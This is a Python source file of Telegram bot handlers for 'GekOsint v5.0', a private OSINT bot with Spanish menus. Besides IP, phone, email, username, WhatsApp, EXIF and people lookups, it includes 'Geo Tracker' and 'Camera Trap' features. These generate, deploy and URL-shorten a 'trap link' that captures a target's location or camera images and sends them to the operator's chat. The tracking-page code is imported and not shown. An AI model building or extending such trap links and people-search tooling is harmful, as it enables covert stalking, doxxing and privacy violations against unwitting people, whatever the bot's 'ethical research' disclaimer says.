from telegram import Update
from telegram.ext import ContextTypes
from ui.menus import main_menu, back_btn
from ui.templates import (
    format_ip_result, format_phone_result, format_username_result,
    format_email_result, format_exif_result, format_whatsapp_result
)
from modules.ip_lookup import get_ip_info
from modules.phone_lookup import analyze_phone
from modules.username_search import search_username
from modules.email_analysis import analyze_email
from modules.tracking import generate_tracking_page
from modules.exif_extract import get_exif
from modules.whatsapp_osint import analyze_whatsapp
from utils.apis import deploy_html, shorten_url
from config import BOT_TOKEN, logger, ALLOWED_USERS, ACCESS_RESTRICTED, ADMIN_ID
from datetime import datetime
from modules.people_search import search_person
from ui.templates import format_person_result

async def person_command(update, context):
    if not await check_access(update, context):
        return
    name = " ".join(context.args).strip() if context.args else ""
    if not name:
        await update.message.reply_text("Uso: /person Nombre Apellido | nickname")
        return
    msg = await update.message.reply_text("⏳ Procesando...", parse_mode='HTML')
    try:
        data = search_person(name)
        out = format_person_result(data)
        await msg.edit_text(out, parse_mode='HTML', disable_web_page_preview=True)
    except Exception as e:
        await msg.edit_text(f"❌ Error: {e}")

# --- Access Control ---
DENIED_MSG = (
    "🔒 <b>ACCESO DENEGADO</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "⛔ No tienes autorización para usar este bot.\n\n"
    "📋 <b>Tu información:</b>\n"
    "• ID: <code>{user_id}</code>\n"
    "• Nombre: {name}\n"
    "• Username: @{username}\n\n"
    "🛡️ <i>Este bot es privado. Solo usuarios autorizados pueden acceder.</i>\n"
    "📩 <i>Contacta al administrador si necesitas acceso.</i>"
)

def is_authorized(user_id: int) -> bool:
    """Verifica si el usuario está en la whitelist hardcodeada."""
    return user_id in ALLOWED_USERS

async def check_access(update: Update, context: ContextTypes.DEFAULT_TYPE = None) -> bool:
    """Verifica acceso, envía denegación y notifica al admin."""
    user = update.effective_user
    if not user:
        return False
    
    if is_authorized(user.id):
        return True
    
    # Log del intento
    logger.warning(f"🚫 Acceso denegado: {user.first_name} (@{user.username}) ID:{user.id}")
    
    msg = DENIED_MSG.format(
        user_id=user.id,
        name=user.full_name or "N/A",
        username=user.username or "sin_username"
    )
    
    if update.callback_query:
        await update.callback_query.answer("🔒 Acceso denegado", show_alert=True)
    elif update.message:
        await update.message.reply_text(msg, parse_mode='HTML')
    
    # Notificar al admin sobre el intento de acceso no autorizado
    if context and ADMIN_ID:
        try:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            alert = (
                f"🚨 <b>INTENTO DE ACCESO</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>Nombre:</b> {user.full_name}\n"
                f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
                f"📛 <b>Username:</b> @{user.username or 'N/A'}\n"
                f"🕐 <b>Hora:</b> {now}\n"
            )
            await context.bot.send_message(ADMIN_ID, alert, parse_mode='HTML')
        except Exception:
            pass
    
    return False

# --- Command Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    
    user = update.effective_user.first_name
    txt = (
        f"👋 <b>Bienvenido, {user}</b>\n\n"
        f"🛡️ <b>GekOsint v5.0</b> — Sistema de Inteligencia OSINT\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔍 <b>IP Lookup</b> — Geoloc, WHOIS, puertos, blacklist\n"
        f"📱 <b>Phone Intel</b> — Operadora, ubicación, Truecaller\n"
        f"👤 <b>Username Search</b> — 50+ plataformas + Telegram\n"
        f"📧 <b>Email Analysis</b> — Reputación, brechas, DNS\n"
        f"💚 <b>WhatsApp OSINT</b> — Registro, spam, Business\n"
        f"🌍 <b>Geo Tracker</b> — Enlace trampa de ubicación\n"
        f"📸 <b>Camera Trap</b> — Captura de cámara remota\n"
        f"🖼️ <b>EXIF Data</b> — Metadatos, GPS, hash\n\n"
        f"<i>🔒 Acceso restringido — {len(ALLOWED_USERS)} usuarios autorizados</i>"
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(txt, reply_markup=main_menu(), parse_mode='HTML')
    else:
        await update.message.reply_text(txt, reply_markup=main_menu(), parse_mode='HTML')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# --- Callback Handler ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == 'start':
        await start(update, context)
        return

    prompts = {
        'menu_ip':    "📡 <b>IP Lookup</b>\n\nEnvía la dirección IP a investigar:",
        'menu_phone': "📱 <b>Phone Intel</b>\n\nEnvía el número con código de país (ej: +52...):",
        'menu_user':  "👤 <b>Username Search</b>\n\nEnvía el username a rastrear:",
        'menu_email': "📧 <b>Email Analysis</b>\n\nEnvía el correo electrónico:",
        'menu_exif':  "🖼️ <b>EXIF Data</b>\n\nEnvía una foto como <b>DOCUMENTO</b> (sin compresión).",
        'menu_wa':    "💚 <b>WhatsApp OSINT</b>\n\nEnvía el número con código de país (ej: +52...):\n\n<i>Obtiene: nombre registrado, foto, tags, estado, links OSINT</i>",
        'menu_about': "ℹ️ <b>GekOsint v5.0</b>\n\n🛡️ Sistema de Inteligencia OSINT\n📋 8 módulos activos\n🔒 Acceso restringido\n☁️ Cloud-Ready\n\n<i>Desarrollado para investigación ética. Uso responsable.</i>"
    }

    if data in prompts:
        context.user_data['mode'] = data
        await query.edit_message_text(prompts[data], reply_markup=back_btn(), parse_mode='HTML')
    
    # Manejo especial para trackers (acciones inmediatas)
    elif data in ['menu_geo', 'menu_cam']:
        await query.edit_message_text("⚙️ <b>Generando Enlace Trampa...</b>\n<i>(Esto puede tardar unos segundos)</i>", parse_mode='HTML')
        
        type_ = "geo" if data == 'menu_geo' else "cam"
        fname, html = generate_tracking_page(BOT_TOKEN, query.message.chat_id, type_)
        
        # Deploy (Asíncrono para no bloquear el bot)
        url = await deploy_html(html, fname)
        
        if url:
            short = await shorten_url(url)
            icon = "🌍" if type_ == "geo" else "📸"
            msg = (
                f"{icon} <b>Enlace {type_.upper()} Generado</b>\n\n"
                f"🔗 <code>{short}</code>\n\n"
                f"⚠️ <i>La información capturada llegará a este chat.</i>\n\n"
                f"📌 <b>Nota:</b> El usuario debe permitir permisos de ubicación/cámara"
            )
            await context.bot.send_message(query.message.chat_id, msg, parse_mode='HTML', reply_markup=back_btn())
        else:
            await context.bot.send_message(query.message.chat_id, "❌ Error al subir archivo. Intenta de nuevo.", reply_markup=back_btn())

# --- Message Handler ---
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    
    mode = context.user_data.get('mode')
    text = update.message.text
    
    if not mode:
        return  # Ignorar mensajes sin contexto

    msg = await update.message.reply_text("⏳ <b>Procesando...</b>", parse_mode='HTML')
    
    try:
        response = "Error desconocido"
        
        if mode == 'menu_ip':
            data = get_ip_info(text.strip())
            response = format_ip_result(data)
            
        elif mode == 'menu_phone':
            data = analyze_phone(text.strip())
            response = format_phone_result(data)
            
        elif mode == 'menu_user':
            found, telegram_data = search_username(text.strip())
            response = format_username_result(text, found, telegram_data)
            
        elif mode == 'menu_email':
            data = analyze_email(text.strip())
            response = format_email_result(data)

        elif mode == 'menu_wa':
            data = analyze_whatsapp(text.strip())
            response = format_whatsapp_result(data)

        await msg.edit_text(response, parse_mode='HTML', disable_web_page_preview=True, reply_markup=back_btn())
        context.user_data.pop('mode', None)
        
    except Exception as e:
        logger.error(f"Error en handler: {e}")
        await msg.edit_text(f"❌ Error: {str(e)}", reply_markup=back_btn())

# --- Document/Photo Handler (EXIF) ---
async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    
    if context.user_data.get('mode') != 'menu_exif':
        return
    
    msg = await update.message.reply_text("⏳ <b>Descargando y analizando...</b>", parse_mode='HTML')
    
    try:
        from io import BytesIO
        
        # Obtener el archivo (ya sea documento o foto)
        if update.message.document:
            file_obj = await update.message.document.get_file()
        elif update.message.photo:
            # Usar la foto con mayor resolución (la última en la lista)
            file_obj = await update.message.photo[-1].get_file()
        else:
            await msg.edit_text("❌ Por favor envía una imagen.", reply_markup=back_btn())
            return

        out = BytesIO()
        await file_obj.download_to_memory(out)
        byte_array = out.getvalue()
        
        data = get_exif(byte_array)
        response = format_exif_result(data)
            
        await msg.edit_text(response, parse_mode='HTML', reply_markup=back_btn())
        
    except Exception as e:
        logger.error(f"Error EXIF: {e}")
        await msg.edit_text(f"❌ Error procesando imagen: {e}", reply_markup=back_btn())
